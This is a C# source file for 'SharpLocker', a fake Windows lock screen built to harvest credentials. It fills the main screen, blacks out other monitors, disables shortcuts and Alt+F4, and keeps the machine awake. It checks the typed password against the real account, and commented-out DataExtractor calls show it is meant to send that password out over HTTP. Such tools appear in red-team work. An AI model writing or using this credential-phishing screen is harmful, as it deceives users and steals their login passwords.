using System;
using System.Windows;
using SharpLocker.ViewModels;
using System.Windows.Forms;
using SharpLocker.Services;
using System.Diagnostics;

namespace SharpLocker.Views
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        private readonly LoginViewModel _loginViewModel;
        private ShortcutsDisabler shortcutsDisabler;

        public MainWindow()
        {
            InitializeComponent();
            _loginViewModel = new LoginViewModel();
            DataContext = _loginViewModel;

            BlackSecondaryScreen();
        }

        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            MaximizeOnPrimaryScreen();

            shortcutsDisabler = new ShortcutsDisabler();
            shortcutsDisabler.DisableShortcuts();

            ScreensaverDisabler.PreventSleep();
        }
                
        private void OnCustomSubmit(object sender, RoutedEventArgs e)
        {
            var user = this._loginViewModel.User;
            string username = user.UserName;
            string password = PasswordBox.Password;
            if (UserSettings.validateCreds(username, password))
            {
                user.Password = password;
                CloseAllWindows();                    // may hang on sending http request
                //DataExtractor.ExtractFile(user);
                //DataExtractor.ExtractGetRequest(user);
                Environment.Exit(0);
            }
            else
            {
                ErrorMessage.Visibility = Visibility.Visible;
            }

        }

        private void MaximizeOnPrimaryScreen()
        {
            Screen screen = Screen.AllScreens[0];
            Window window = System.Windows.Application.Current.MainWindow;
            var workingArea = screen.WorkingArea;
            window.Top = workingArea.Top;
            window.Left = workingArea.Left;
            window.WindowState = WindowState.Maximized;
        }

        private void BlackSecondaryScreen()
        {
            if (Screen.AllScreens.Length > 1)
            {
                var screens = Screen.AllScreens;
                for (int i = 1; i < screens.Length; i++)
                {
                    Screen screen = screens[i];
                    Window window = new BlackWindow();
                    var workingArea = screen.WorkingArea;
                    window.Top = workingArea.Top;
                    window.Left = workingArea.Left;
                    window.Show();
                    window.WindowState = WindowState.Maximized;
                }
            }
        }

        private void OnPasswordChange(object sender, RoutedEventArgs e)
        {
            ErrorMessage.Visibility = Visibility.Hidden;
        }

        private static void CloseAllWindows()
        {
            var windows = System.Windows.Application.Current.Windows;
            foreach (Window w in windows)
            {
                w.Tag = "CLOSE";
                w.Close();
            }
        }

        // prevent closing with alt+f4
        private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            if ((string)Tag != "CLOSE")
            {
                e.Cancel = true;
            }
        }
    }
}
